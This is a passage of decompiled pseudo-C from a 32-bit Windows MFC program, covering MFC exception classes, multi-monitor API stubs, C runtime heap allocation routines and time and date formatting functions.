  memset(a1, 0, 4 * ((unsigned int)(8 * (_DWORD)a2) >> 2));
  result = a2;
  if ( a2 )
  {
    v4 = a2;
    do
    {
      if ( v2 )
        result = sub_408FA0(v2);
      v2 += 2;
      v4 = (_DWORD *)((char *)v4 - 1);
    }
    while ( v4 );
  }
  return result;
}

//----- (0040A780) --------------------------------------------------------
int sub_40A780()
{
  struct CWinThread *Thread; // eax

  Thread = AfxGetThread();
  if ( Thread )
    return (*(int (__thiscall **)(struct CWinThread *))(*(_DWORD *)Thread + 116))(Thread);
  else
    return 0;
}

//----- (0040A7A1) --------------------------------------------------------
CException *__thiscall sub_40A7A1(CException *this, int a2, int a3)
{
  CException::CException(this, a2);
  *((_DWORD *)this + 3) = 0;
  *((_DWORD *)this + 4) = 0;
  *((_DWORD *)this + 37) = a3;
  *(_DWORD *)this = &CResourceException::`vftable';
  return this;
}
// 420740: using guessed type void *CResourceException::`vftable';

//----- (0040A7CB) --------------------------------------------------------
_DWORD *__thiscall sub_40A7CB(_DWORD *lpMem, char a2)
{
  sub_40A7E7(lpMem);
  if ( (a2 & 1) != 0 )
    sub_417A1C(lpMem);
  return lpMem;
}

//----- (0040A7E7) --------------------------------------------------------
void __thiscall sub_40A7E7(_DWORD *this)
{
  *this = &CResourceException::`vftable';
}
// 420740: using guessed type void *CResourceException::`vftable';

//----- (0040A7EE) --------------------------------------------------------
CException *__thiscall sub_40A7EE(CException *this, int a2, int a3)
{
  CException::CException(this, a2);
  *((_DWORD *)this + 3) = 0;
  *((_DWORD *)this + 4) = 0;
  *((_DWORD *)this + 37) = a3;
  *(_DWORD *)this = &CUserException::`vftable';
  return this;
}
// 420758: using guessed type void *CUserException::`vftable';

//----- (0040A818) --------------------------------------------------------
_DWORD *__thiscall sub_40A818(_DWORD *lpMem, char a2)
{
  sub_40A834(lpMem);
  if ( (a2 & 1) != 0 )
    sub_417A1C(lpMem);
  return lpMem;
}

//----- (0040A834) --------------------------------------------------------
void __thiscall sub_40A834(_DWORD *this)
{
  *this = &CUserException::`vftable';
}
// 420758: using guessed type void *CUserException::`vftable';

//----- (0040A83B) --------------------------------------------------------
BOOL __thiscall sub_40A83B(HDC *this, int x, int y)
{
  return PtVisible(this[1], x, y);
}

//----- (0040A84F) --------------------------------------------------------
BOOL __thiscall sub_40A84F(HDC *this, RECT *lprect)
{
  return RectVisible(this[1], lprect);
}

//----- (0040A85F) --------------------------------------------------------
BOOL __thiscall sub_40A85F(HDC *this, int x, int y, LPCSTR lpString, int c)
{
  return TextOutA(this[1], x, y, lpString, c);
}

//----- (0040A8D8) --------------------------------------------------------
int __thiscall sub_40A8D8(HDC *this, LPCSTR lpchText, int cchText, LPRECT lprc, UINT format)
{
  return DrawTextA(this[1], lpchText, cchText, lprc, format);
}

//----- (0040A924) --------------------------------------------------------
int __thiscall sub_40A924(HDC *this, int iEscape, int cjIn, LPCSTR pvIn, LPVOID pvOut)
{
  return Escape(this[1], iEscape, cjIn, pvIn, pvOut);
}

//----- (0040AA47) --------------------------------------------------------
BOOL __thiscall sub_40AA47(HWND *this)
{
  return EnableWindow(this[7], 0);
}

//----- (0040AA5F) --------------------------------------------------------
_DWORD *__thiscall sub_40AA5F(_DWORD *lpMem, char a2)
{
  sub_40AA7B(lpMem);
  if ( (a2 & 1) != 0 )
    sub_417A1C(lpMem);
  return lpMem;
}

//----- (0040AA7B) --------------------------------------------------------
void __thiscall sub_40AA7B(_DWORD *this)
{
  *this = &CArchiveException::`vftable';
  sub_417CB2(this + 3);
}
// 420808: using guessed type void *CArchiveException::`vftable';

//----- (0040AAA7) --------------------------------------------------------
CException *__thiscall sub_40AAA7(CException *this, int a2, int a3)
{
  CException::CException(this, a2);
  *((_DWORD *)this + 3) = 0;
  *((_DWORD *)this + 4) = 0;
  *((_DWORD *)this + 37) = a3;
  *(_DWORD *)this = &CMemoryException::`vftable';
  return this;
}
// 4208A8: using guessed type void *CMemoryException::`vftable';

//----- (0040AAD1) --------------------------------------------------------
_DWORD *__thiscall sub_40AAD1(_DWORD *lpMem, char a2)
{
  sub_40AAED(lpMem);
  if ( (a2 & 1) != 0 )
    sub_417A1C(lpMem);
  return lpMem;
}

//----- (0040AAED) --------------------------------------------------------
void __thiscall sub_40AAED(_DWORD *this)
{
  *this = &CMemoryException::`vftable';
}
// 4208A8: using guessed type void *CMemoryException::`vftable';

//----- (0040AAF4) --------------------------------------------------------
CException *__thiscall sub_40AAF4(CException *this, int a2, int a3)
{
  CException::CException(this, a2);
  *((_DWORD *)this + 3) = 0;
  *((_DWORD *)this + 4) = 0;
  *((_DWORD *)this + 37) = a3;
  *(_DWORD *)this = &CNotSupportedException::`vftable';
  return this;
}
// 4208C0: using guessed type void *CNotSupportedException::`vftable';

//----- (0040AB1E) --------------------------------------------------------
_DWORD *__thiscall sub_40AB1E(_DWORD *lpMem, char a2)
{
  sub_40AB3A(lpMem);
  if ( (a2 & 1) != 0 )
    sub_417A1C(lpMem);
  return lpMem;
}

//----- (0040AB3A) --------------------------------------------------------
void __thiscall sub_40AB3A(_DWORD *this)
{
  *this = &CNotSupportedException::`vftable';
}
// 4208C0: using guessed type void *CNotSupportedException::`vftable';

//----- (0040AB41) --------------------------------------------------------
int __stdcall sub_40AB41(int a1, int a2)
{
  return 1;
}

//----- (0040AB47) --------------------------------------------------------
LPVOID __thiscall sub_40AB47(LPVOID lpMem, char a2)
{
  sub_40AB63((int)lpMem);
  if ( (a2 & 1) != 0 )
    sub_417A1C(lpMem);
  return lpMem;
}

//----- (0040AB63) --------------------------------------------------------
void *__thiscall sub_40AB63(int this)
{
  *(_DWORD *)this = &CCriticalSection::`vftable';
  DeleteCriticalSection((LPCRITICAL_SECTION)(this + 8));
  return sub_40AF9B((_DWORD *)this);
}
// 42093C: using guessed type void *CCriticalSection::`vftable';

//----- (0040AB9D) --------------------------------------------------------
BOOL sub_40AB9D()
{
  BOOL result; // eax
  HMODULE ModuleHandleA; // eax
  HMODULE v2; // edi

  if ( dword_4455D0 )
    return GetMonitorInfoA != 0;
  ModuleHandleA = GetModuleHandleA("USER32");
  v2 = ModuleHandleA;
  if ( ModuleHandleA
    && (GetSystemMetrics_0 = (int (__stdcall *)(int))GetProcAddress(ModuleHandleA, "GetSystemMetrics")) != 0
    && (MonitorFromWindow = (HMONITOR (__stdcall *)(HWND, DWORD))GetProcAddress(v2, "MonitorFromWindow")) != 0
    && (MonitorFromRect = (HMONITOR (__stdcall *)(LPCRECT, DWORD))GetProcAddress(v2, "MonitorFromRect")) != 0
    && (MonitorFromPoint = (HMONITOR (__stdcall *)(POINT, DWORD))GetProcAddress(v2, "MonitorFromPoint")) != 0
    && (EnumDisplayMonitors = (BOOL (__stdcall *)(HDC, LPCRECT, MONITORENUMPROC, LPARAM))GetProcAddress(
                                                                                           v2,
                                                                                           "EnumDisplayMonitors")) != 0
    && (GetMonitorInfoA = (BOOL (__stdcall *)(HMONITOR, LPMONITORINFO))GetProcAddress(v2, "GetMonitorInfoA")) != 0 )
  {
    result = 1;
    dword_4455D0 = 1;
  }
  else
  {
    GetSystemMetrics_0 = 0;
    MonitorFromWindow = 0;
    MonitorFromRect = 0;
    MonitorFromPoint = 0;
    GetMonitorInfoA = 0;
    EnumDisplayMonitors = 0;
    dword_4455D0 = 1;
    return 0;
  }
  return result;
}
// 4455D0: using guessed type int dword_4455D0;

//----- (0040AC75) --------------------------------------------------------
HMONITOR __stdcall sub_40AC75(LPCRECT lprc, DWORD dwFlags)
{
  if ( sub_40AB9D() )
    return MonitorFromRect(lprc, dwFlags);
  if ( (dwFlags & 3) != 0
    || lprc->right > 0 && lprc->bottom > 0 && lprc->left < GetSystemMetrics(0) && lprc->top < GetSystemMetrics(1) )
  {
    return (HMONITOR)305397826;
  }
  return 0;
}

//----- (0040AD36) --------------------------------------------------------
BOOL __stdcall sub_40AD36(HMONITOR hMonitor, LPMONITORINFO lpmi)
{
  int SystemMetrics; // eax
  bool v4; // cf
  _DWORD pvParam[4]; // [esp+8h] [ebp-10h] BYREF

  if ( sub_40AB9D() )
    return GetMonitorInfoA(hMonitor, lpmi);
  if ( hMonitor != (HMONITOR)305397826 || !lpmi || lpmi->cbSize < 0x28 || !SystemParametersInfoA(0x30u, 0, pvParam, 0) )
    return 0;
  lpmi->rcMonitor.left = 0;
  lpmi->rcMonitor.top = 0;
  lpmi->rcMonitor.right = GetSystemMetrics(0);
  SystemMetrics = GetSystemMetrics(1);
  lpmi->rcWork.left = pvParam[0];
  lpmi->rcWork.top = pvParam[1];
  lpmi->rcWork.right = pvParam[2];
  v4 = lpmi->cbSize < 0x48;
  lpmi->rcWork.bottom = pvParam[3];
  lpmi->rcMonitor.bottom = SystemMetrics;
  lpmi->dwFlags = 1;
  if ( !v4 )
    lstrcpyA((LPSTR)&lpmi[1], "DISPLAY");
  return 1;
}
// 40AD36: using guessed type _DWORD pvParam[4];

//----- (0040ADED) --------------------------------------------------------
_DWORD *__thiscall sub_40ADED(_DWORD *lpMem, char a2)
{
  sub_40AE09(lpMem);
  if ( (a2 & 1) != 0 )
    sub_417A1C(lpMem);
  return lpMem;
}

//----- (0040AE09) --------------------------------------------------------
int __thiscall sub_40AE09(_DWORD *this)
{
  *this = &CHandleMap::`vftable';
  sub_41AC76();
  sub_416B8B(this + 8);
  return sub_416B8B(this + 1);
}
// 41AC76: using guessed type int sub_41AC76(void);
// 420F28: using guessed type void *CHandleMap::`vftable';

//----- (0040AE51) --------------------------------------------------------
char *__thiscall sub_40AE51(char *this, int a2, int a3)
{
  *((_DWORD *)this + 3) = 0;
  *((_DWORD *)this + 2) = 0;
  *(_DWORD *)this = a2;
  *((_DWORD *)this + 1) = a3;
  InitializeCriticalSection((LPCRITICAL_SECTION)(this + 16));
  return this;
}

//----- (0040AE8D) --------------------------------------------------------
void __thiscall sub_40AE8D(int this)
{
  struct _RTL_CRITICAL_SECTION *v2; // edi

  v2 = (struct _RTL_CRITICAL_SECTION *)(this + 16);
  EnterCriticalSection((LPCRITICAL_SECTION)(this + 16));
  CPlex::FreeDataChain(*(CPlex **)(this + 8));
  *(_DWORD *)(this + 8) = 0;
  *(_DWORD *)(this + 12) = 0;
  LeaveCriticalSection(v2);
}

//----- (0040AEB5) --------------------------------------------------------
_DWORD *__thiscall sub_40AEB5(char *this)
{
  struct _RTL_CRITICAL_SECTION *v2; // ebx
  _DWORD *v3; // eax
  int v4; // ecx
  _DWORD *v5; // edi
  unsigned int v7; // [esp-4h] [ebp-28h]
  _DWORD v8[9]; // [esp+0h] [ebp-24h] BYREF

  v8[5] = v8;
  v8[4] = this;
  v2 = (struct _RTL_CRITICAL_SECTION *)(this + 16);
  EnterCriticalSection((LPCRITICAL_SECTION)(this + 16));
  if ( !*((_DWORD *)this + 3) )
  {
    v7 = *(_DWORD *)this;
    v8[8] = 0;
    v3 = (_DWORD *)((char *)CPlex::Create((struct CPlex **)this + 2, *((_DWORD *)this + 1), v7)
                  + *(_DWORD *)this * (*((_DWORD *)this + 1) - 1)
                  + 4);
    if ( *((_DWORD *)this + 1) - 1 >= 0 )
    {
      v4 = *((_DWORD *)this + 1);
      do
      {
        *v3 = *((_DWORD *)this + 3);
        *((_DWORD *)this + 3) = v3;
        v3 = (_DWORD *)((char *)v3 - *(_DWORD *)this);
        --v4;
      }
      while ( v4 );
    }
  }
  v5 = (_DWORD *)*((_DWORD *)this + 3);
  *((_DWORD *)this + 3) = *v5;
  LeaveCriticalSection(v2);
  return v5;
}

//----- (0040AF44) --------------------------------------------------------
void __thiscall sub_40AF44(int this, _DWORD *a2)
{
  if ( a2 )
  {
    EnterCriticalSection((LPCRITICAL_SECTION)(this + 16));
    *a2 = *(_DWORD *)(this + 12);
    *(_DWORD *)(this + 12) = a2;
    LeaveCriticalSection((LPCRITICAL_SECTION)(this + 16));
  }
}

//----- (0040AF7F) --------------------------------------------------------
_DWORD *__thiscall sub_40AF7F(_DWORD *lpMem, char a2)
{
  sub_40AF9B(lpMem);
  if ( (a2 & 1) != 0 )
    sub_417A1C(lpMem);
  return lpMem;
}

//----- (0040AF9B) --------------------------------------------------------
void *__thiscall sub_40AF9B(_DWORD *this)
{
  void *result; // eax

  result = (void *)this[1];
  *this = &CSyncObject::`vftable';
  if ( result )
  {
    result = (void *)CloseHandle(result);
    this[1] = 0;
  }
  return result;
}
// 421004: using guessed type void *CSyncObject::`vftable';

//----- (0040AFCD) --------------------------------------------------------
unsigned int *__thiscall sub_40AFCD(unsigned int *lpMem, char a2)
{
  sub_40AFE9(lpMem);
  if ( (a2 & 1) != 0 )
    sub_417A1C(lpMem);
  return lpMem;
}

//----- (0040AFE9) --------------------------------------------------------
BOOL __thiscall sub_40AFE9(unsigned int *this)
{
  *this = (unsigned int)&CMenu::`vftable';
  return sub_41ADAA(this);
}
// 42106C: using guessed type void *CMenu::`vftable';

//----- (0040B886) --------------------------------------------------------
void __cdecl sub_40B886(LPVOID lpMem)
{
  _DWORD *block; // eax
  bool v2; // zf
  _BYTE *v3; // eax
  void **v4; // [esp+Ch] [ebp-28h] BYREF
  _BYTE *v5; // [esp+10h] [ebp-24h]
  int v6; // [esp+14h] [ebp-20h] BYREF
  _DWORD *v7; // [esp+18h] [ebp-1Ch]
  CPPEH_RECORD ms_exc; // [esp+1Ch] [ebp-18h]

  if ( lpMem )
  {
    if ( dword_446D6C == 3 )
    {
      _lock(9);
      ms_exc.registration.TryLevel = 0;
      block = (_DWORD *)__sbh_find_block(lpMem);
      v7 = block;
      if ( block )
        sub_4119F6(block, (int)lpMem);
      ms_exc.registration.TryLevel = -1;
      _unlock(9);
      v2 = v7 == 0;
    }
    else
    {
      if ( dword_446D6C != 2 )
      {
LABEL_11:
        HeapFree(dword_446D68, 0, lpMem);
        return;
      }
      _lock(9);
      ms_exc.registration.TryLevel = 1;
      v3 = (_BYTE *)sub_412726((unsigned int)lpMem, &v4, (unsigned int *)&v6);
      v5 = v3;
      if ( v3 )
        sub_41277D((int)v4, v6, v3);
      ms_exc.registration.TryLevel = -1;
      _unlock(9);
      v2 = v5 == 0;
    }
    if ( !v2 )
      return;
    goto LABEL_11;
  }
}
// 4119CB: using guessed type _DWORD __cdecl __sbh_find_block(_DWORD);
// 412BC0: using guessed type _DWORD __cdecl _lock(_DWORD);
// 412C21: using guessed type _DWORD __cdecl _unlock(_DWORD);
// 446D6C: using guessed type int dword_446D6C;

//----- (0040B9AD) --------------------------------------------------------
LPVOID __cdecl sub_40B9AD(unsigned int a1)
{
  LPVOID result; // eax
  unsigned int v2; // esi
  int v3; // eax
  SIZE_T v4; // eax
  void *v5; // [esp+Ch] [ebp-1Ch]
  int v6; // [esp+Ch] [ebp-1Ch]

  if ( dword_446D6C == 3 )
  {
    if ( a1 <= dword_446D64 )
    {
      _lock(9);
      v5 = (void *)__sbh_alloc_block(a1);
      _unlock(9);
      result = v5;
      if ( v5 )
        return result;
    }
    goto LABEL_12;
  }
  if ( dword_446D6C != 2 )
  {
LABEL_12:
    v3 = a1;
    if ( !a1 )
      v3 = 1;
    v4 = v3 + 15;
    LOBYTE(v4) = v4 & 0xF0;
    return HeapAlloc(dword_446D68, 0, v4);
  }
  if ( a1 )
    v2 = (a1 + 15) & 0xFFFFFFF0;
  else
    v2 = 16;
  if ( v2 > dword_42A1AC )
    return HeapAlloc(dword_446D68, 0, v2);
  _lock(9);
  v6 = sub_4127C2(v2 >> 4);
  _unlock(9);
  result = (LPVOID)v6;
  if ( !v6 )
    return HeapAlloc(dword_446D68, 0, v2);
  return result;
}
// 411D1F: using guessed type _DWORD __cdecl __sbh_alloc_block(_DWORD);
// 412BC0: using guessed type _DWORD __cdecl _lock(_DWORD);
// 412C21: using guessed type _DWORD __cdecl _unlock(_DWORD);
// 42A1AC: using guessed type int dword_42A1AC;
// 446D64: using guessed type int dword_446D64;
// 446D6C: using guessed type int dword_446D6C;

//----- (0040C111) --------------------------------------------------------
void *__cdecl sub_40C111(LPVOID lpMem, SIZE_T dwBytes)
{
  void *v2; // ebx
  void *result; // eax
  unsigned int v4; // esi
  _DWORD *block; // eax
  size_t v6; // eax
  size_t v7; // eax
  _BYTE *v8; // eax
  _BYTE *v9; // edi
  size_t v10; // eax
  size_t v11; // eax
  void **v12; // [esp+Ch] [ebp-38h] BYREF
  size_t v13; // [esp+10h] [ebp-34h]
  _BYTE *v14; // [esp+14h] [ebp-30h]
  _DWORD *v15; // [esp+18h] [ebp-2Ch] BYREF
  _DWORD *v16; // [esp+1Ch] [ebp-28h]
  void *v17; // [esp+20h] [ebp-24h]
  size_t v18; // [esp+24h] [ebp-20h]
  CPPEH_RECORD ms_exc; // [esp+2Ch] [ebp-18h]

  v2 = lpMem;
  if ( !lpMem )
    return malloc(dwBytes);
  v4 = dwBytes;
  if ( dwBytes )
  {
    if ( dword_446D6C == 3 )
    {
      while ( 1 )
      {
        v17 = 0;
        if ( v4 <= 0xFFFFFFE0 )
        {
          _lock(9);
          ms_exc.registration.TryLevel = 0;
          block = (_DWORD *)__sbh_find_block(lpMem);
          v16 = block;
          if ( block )
          {
            if ( v4 <= dword_446D64 )
            {
              if ( __sbh_resize_block(block, lpMem, v4) )
              {
                v17 = lpMem;
              }
              else
              {
                v17 = (void *)__sbh_alloc_block(v4);
                if ( v17 )
                {
                  v6 = *((_DWORD *)lpMem - 1) - 1;
                  v18 = v6;
                  if ( v6 >= v4 )
                    v6 = v4;
                  memcpy_0(v17, lpMem, v6);
                  v16 = (_DWORD *)__sbh_find_block(lpMem);
                  sub_4119F6(v16, (int)lpMem);
                }
              }
            }
            if ( !v17 )
            {
              if ( !v4 )
                v4 = 1;
              v4 = (v4 + 15) & 0xFFFFFFF0;
              v17 = HeapAlloc(dword_446D68, 0, v4);
              if ( v17 )
              {
                v7 = *((_DWORD *)lpMem - 1) - 1;
                v18 = v7;
                if ( v7 >= v4 )
                  v7 = v4;
                memcpy_0(v17, lpMem, v7);
                sub_4119F6(v16, (int)lpMem);
              }
            }
          }
          ms_exc.registration.TryLevel = -1;
          _unlock(9);
          if ( !v16 )
          {
            if ( !v4 )
              v4 = 1;
            v4 = (v4 + 15) & 0xFFFFFFF0;
            v17 = HeapReAlloc(dword_446D68, 0, lpMem, v4);
          }
        }
        result = v17;
        if ( v17 || !dword_445A88 )
          break;
        if ( !_callnewh(v4) )
          return 0;
      }
    }
    else if ( dword_446D6C == 2 )
    {
      if ( dwBytes <= 0xFFFFFFE0 )
        v4 = (dwBytes + 15) & 0xFFFFFFF0;
      while ( 1 )
      {
        v17 = 0;
        if ( v4 <= 0xFFFFFFE0 )
        {
          _lock(9);
          ms_exc.registration.TryLevel = 1;
          v8 = (_BYTE *)sub_412726((unsigned int)v2, &v12, (unsigned int *)&v15);
          v9 = v8;
          v14 = v8;
          if ( v8 )
          {
            if ( v4 < dword_42A1AC )
            {
              if ( sub_412AEE((int)v12, v15, v8, v4 >> 4) )
              {
                v17 = lpMem;
              }
              else
              {
                v17 = (void *)sub_4127C2(v4 >> 4);
                if ( v17 )
                {
                  v10 = 16 * (unsigned __int8)*v9;
                  v13 = v10;
                  if ( v10 >= v4 )
                    v10 = v4;
                  memcpy_0(v17, lpMem, v10);
                  sub_41277D((int)v12, (int)v15, v9);
                }
              }
              v2 = lpMem;
            }
            if ( !v17 )
            {
              v17 = HeapAlloc(dword_446D68, 0, v4);
              if ( v17 )
              {
                v11 = 16 * (unsigned __int8)*v9;
                v13 = v11;
                if ( v11 >= v4 )
                  v11 = v4;
                memcpy_0(v17, v2, v11);
                sub_41277D((int)v12, (int)v15, v9);
              }
            }
          }
          else
          {
            v17 = HeapReAlloc(dword_446D68, 0, v2, v4);
          }
          ms_exc.registration.TryLevel = -1;
          _unlock(9);
        }
        result = v17;
        if ( v17 || !dword_445A88 )
          break;
        if ( !_callnewh(v4) )
          return 0;
      }
    }
    else
    {
      while ( 1 )
      {
        result = 0;
        if ( v4 <= 0xFFFFFFE0 )
        {
          if ( !v4 )
            v4 = 1;
          v4 = (v4 + 15) & 0xFFFFFFF0;
          result = HeapReAlloc(dword_446D68, 0, lpMem, v4);
        }
        if ( result || !dword_445A88 )
          break;
        if ( !_callnewh(v4) )
          return 0;
      }
    }
  }
  else
  {
    sub_40B886(lpMem);
    return 0;
  }
  return result;
}
// 40C2B5: conditional instruction was optimized away because %dwBytes.4 is in (1..FFFFFFE0)
// 4119CB: using guessed type _DWORD __cdecl __sbh_find_block(_DWORD);
// 411D1F: using guessed type _DWORD __cdecl __sbh_alloc_block(_DWORD);
// 4121D4: using guessed type _DWORD __cdecl __sbh_resize_block(_DWORD, _DWORD, _DWORD);
// 412BC0: using guessed type _DWORD __cdecl _lock(_DWORD);
// 412C21: using guessed type _DWORD __cdecl _unlock(_DWORD);
// 42A1AC: using guessed type int dword_42A1AC;
// 446D64: using guessed type int dword_446D64;
// 446D6C: using guessed type int dword_446D6C;

//----- (0040CB32) --------------------------------------------------------
int __cdecl sub_40CB32(int a1, int a2)
{
  unsigned int v2; // esi
  int result; // eax
  void *v4; // [esp+14h] [ebp-20h]
  size_t v5; // [esp+18h] [ebp-1Ch]

  v2 = a2 * a1;
  v5 = a2 * a1;
  if ( (unsigned int)(a2 * a1) <= 0xFFFFFFE0 )
  {
    if ( !v2 )
      v2 = 1;
    v2 = (v2 + 15) & 0xFFFFFFF0;
  }
  while ( 1 )
  {
    v4 = 0;
    if ( v2 <= 0xFFFFFFE0 )
    {
      if ( dword_446D6C == 3 )
      {
        if ( v5 > dword_446D64 )
          goto LABEL_14;
        _lock(9);
        v4 = (void *)__sbh_alloc_block(v5);
        _unlock(9);
        if ( v4 )
        {
          memset(v4, 0, v5);
          goto LABEL_14;
        }
LABEL_15:
        v4 = HeapAlloc(dword_446D68, 8u, v2);
        goto LABEL_16;
      }
      if ( dword_446D6C == 2 && v2 <= dword_42A1AC )
      {
        _lock(9);
        v4 = (void *)sub_4127C2(v2 >> 4);
        _unlock(9);
        if ( !v4 )
          goto LABEL_15;
        memset(v4, 0, v2);
      }
LABEL_14:
      if ( v4 )
        return (int)v4;
      goto LABEL_15;
    }
LABEL_16:
    if ( v4 || !dword_445A88 )
      return (int)v4;
    result = _callnewh(v2);
    if ( !result )
      return result;
  }
}
// 411D1F: using guessed type _DWORD __cdecl __sbh_alloc_block(_DWORD);
// 412BC0: using guessed type _DWORD __cdecl _lock(_DWORD);
// 412C21: using guessed type _DWORD __cdecl _unlock(_DWORD);
// 42A1AC: using guessed type int dword_42A1AC;
// 446D64: using guessed type int dword_446D64;
// 446D6C: using guessed type int dword_446D6C;

//----- (0040D7AA) --------------------------------------------------------
unsigned int __cdecl sub_40D7AA(unsigned __int8 *a1, unsigned int a2, unsigned __int8 *a3, int a4)
{
  return sub_40D7C5(a1, a2, a3, a4, 0);
}

//----- (0040D7C5) --------------------------------------------------------
unsigned int __cdecl sub_40D7C5(unsigned __int8 *a1, unsigned int a2, unsigned __int8 *a3, int a4, char **a5)
{
  char **v5; // eax
  unsigned __int8 *v6; // esi
  unsigned __int8 v7; // al
  char *v8; // esi
  int v10; // [esp+Ch] [ebp-8h]
  unsigned int v11; // [esp+10h] [ebp-4h] BYREF

  v11 = a2;
  InterlockedIncrement(&Addend);
  if ( dword_446D44 )
  {
    InterlockedDecrement(&Addend);
    _lock(19);
    v10 = 1;
  }
  else
  {
    v10 = 0;
  }
  v5 = a5;
  if ( !a5 )
    v5 = off_427BD8;
  a5 = v5;
  if ( v11 )
  {
    v6 = a3;
    do
    {
      v7 = *v6;
      if ( !*v6 )
        break;
      if ( v7 == 37 )
      {
        dword_4470A8 = 0;
        v8 = (char *)(v6 + 1);
        if ( *v8 == 35 )
        {
          dword_4470A8 = 1;
          ++v8;
        }
        _expandtime(*v8, a4, &a1, &v11, a5);
        v6 = (unsigned __int8 *)(v8 + 1);
      }
      else
      {
        if ( *((char *)off_42A37C + 2 * v7 + 1) < 0 && v11 > 1 )
        {
          *a1++ = v7;
          ++v6;
          --v11;
        }
        *a1++ = *v6++;
        --v11;
      }
    }
    while ( v11 );
  }
  if ( v10 )
    _unlock(19);
  else
    InterlockedDecrement(&Addend);
  if ( !v11 )
    return 0;
  *a1 = 0;
  return a2 - v11;
}
// 40D8BF: using guessed type _DWORD __cdecl _expandtime(char, _DWORD, _DWORD, _DWORD, _DWORD);
// 412BC0: using guessed type _DWORD __cdecl _lock(_DWORD);
// 412C21: using guessed type _DWORD __cdecl _unlock(_DWORD);
// 427BD8: using guessed type char **off_427BD8;
// 42A37C: using guessed type void *off_42A37C;
// 446D44: using guessed type int dword_446D44;
// 4470A8: using guessed type int dword_4470A8;

//----- (0040DD8D) --------------------------------------------------------
void __cdecl sub_40DD8D(char *String1, int a2, _DWORD *a3, _DWORD *a4, int a5)
{
  char *v5; // ebx
  int v8; // ecx
  _BYTE *v9; // eax
  char *v10; // ebx
  unsigned __int8 v11; // al
  unsigned __int8 *v12; // eax
  unsigned __int8 v13; // cl
  char String1_3; // [esp+1Bh] [ebp+Bh]
  int v15; // [esp+20h] [ebp+10h]
  int v16; // [esp+20h] [ebp+10h]
  char v17; // [esp+24h] [ebp+14h]

  v5 = String1;
  while ( *v5 )
  {
    v8 = 0;
    if ( !*a4 )
      return;
    dword_4470AC = 0;
    String1_3 = *v5;
    v15 = (int)(v5 + 1);
    do
    {
      v9 = (_BYTE *)v15;
      ++v8;
      ++v15;
    }
    while ( *v9 == String1_3 );
    v16 = v15 - 1;
    if ( String1_3 > 100 )
    {
      switch ( String1_3 )
      {
        case 'h':
          if ( v8 == 1 )
          {
            dword_4470AC = 1;
          }
          else if ( v8 != 2 )
          {
LABEL_12:
            if ( *((char *)off_42A37C + 2 * (unsigned __int8)String1_3 + 1) < 0 )
            {
              ++v5;
              *(_BYTE *)(*a3)++ = String1_3;
              --*a4;
            }
            *(_BYTE *)(*a3)++ = *v5++;
            --*a4;
            continue;
          }
          v17 = 73;
          break;
        case 'm':
          if ( v8 == 1 )
          {
            dword_4470AC = 1;
          }
          else if ( v8 != 2 )
          {
            goto LABEL_12;
          }
          v17 = 77;
          break;
        case 's':
          if ( v8 == 1 )
          {
            dword_4470AC = 1;
          }
          else if ( v8 != 2 )
          {
            goto LABEL_12;
          }
          v17 = 83;
          break;
        case 't':
          if ( *(int *)(a2 + 8) > 11 )
            v12 = *(unsigned __int8 **)(a5 + 156);
          else
            v12 = *(unsigned __int8 **)(a5 + 152);
          if ( v8 == 1 && *a4 )
          {
            if ( *((char *)off_42A37C + 2 * *v12 + 1) < 0 && *a4 > 1u )
            {
              *(_BYTE *)(*a3)++ = *v12++;
              --*a4;
            }
            *(_BYTE *)(*a3)++ = *v12;
            --*a4;
          }
          else
          {
            while ( 1 )
            {
              v13 = *v12;
              if ( !*v12 || !*a4 )
                break;
              if ( *((char *)off_42A37C + 2 * v13 + 1) < 0 && *a4 > 1u )
              {
                *(_BYTE *)(*a3)++ = v13;
                ++v12;
                --*a4;
              }
              *(_BYTE *)(*a3)++ = *v12++;
              --*a4;
            }
          }
          goto LABEL_73;
        case 'y':
          if ( v8 == 2 )
          {
            v17 = 121;
          }
          else
          {
            if ( v8 != 4 )
              goto LABEL_12;
            v17 = 89;
          }
          break;
        default:
          goto LABEL_12;
      }
    }
    else
    {
      switch ( String1_3 )
      {
        case 'd':
          if ( v8 == 1 )
          {
            dword_4470AC = 1;
          }
          else if ( v8 != 2 )
          {
            if ( v8 == 3 )
            {
              v17 = 97;
            }
            else
            {
              if ( v8 != 4 )
                goto LABEL_12;
              v17 = 65;
            }
            break;
          }
          v17 = 100;
          break;
        case '\'':
          if ( (v8 & 1) != 0 )
          {
            for ( v5 += v8; ; ++v5 )
            {
              v11 = *v5;
              if ( !*v5 || !*a4 )
                break;
              if ( v11 == 39 )
              {
                ++v5;
                goto LABEL_15;
              }
              if ( *((char *)off_42A37C + 2 * v11 + 1) < 0 && *a4 > 1u )
              {
                *(_BYTE *)(*a3)++ = v11;
                ++v5;
                --*a4;
              }
              *(_BYTE *)(*a3)++ = *v5;
              --*a4;
            }
          }
          else
          {
            v5 += v8;
          }
          continue;
        case 'A':
          goto LABEL_30;
        case 'H':
          if ( v8 == 1 )
          {
            dword_4470AC = 1;
          }
          else if ( v8 != 2 )
          {
            goto LABEL_12;
          }
          v17 = 72;
          break;
        case 'M':
          if ( v8 == 1 )
          {
            dword_4470AC = 1;
          }
          else if ( v8 != 2 )
          {
            if ( v8 == 3 )
            {
              v17 = 98;
            }
            else
            {
              if ( v8 != 4 )
                goto LABEL_12;
              v17 = 66;
            }
            break;
          }
          v17 = 109;
          break;
        case 'a':
LABEL_30:
          if ( !_strcmpi(v5, "am/pm") )
          {
            v10 = v5 + 5;
            goto LABEL_34;
          }
          if ( !_strcmpi(v5, "a/p") )
          {
            v10 = v5 + 3;
LABEL_34:
            v16 = (int)v10;
          }
          v17 = 112;
          break;
        default:
          goto LABEL_12;
      }
    }
    _expandtime(v17, a2, a3, a4, a5);
LABEL_73:
    v5 = (char *)v16;
LABEL_15:
    ;
  }
}
// 40D8BF: using guessed type _DWORD __cdecl _expandtime(char, _DWORD, _DWORD, _DWORD, _DWORD);
// 42A37C: using guessed type void *off_42A37C;
// 4470AC: using guessed type int dword_4470AC;

//----- (0040E599) --------------------------------------------------------
LPVOID __cdecl sub_40E599(LPVOID lpMem, unsigned int a2)
{
  unsigned int v2; // esi
  int block; // eax
  unsigned int v5; // esi
  _BYTE *v6; // eax
  void **v7; // [esp+Ch] [ebp-2Ch] BYREF
  _BYTE *v8; // [esp+10h] [ebp-28h]
  _DWORD *v9; // [esp+14h] [ebp-24h] BYREF
  int v10; // [esp+18h] [ebp-20h]
  LPVOID v11; // [esp+1Ch] [ebp-1Ch]
  CPPEH_RECORD ms_exc; // [esp+20h] [ebp-18h] BYREF

  v2 = a2;
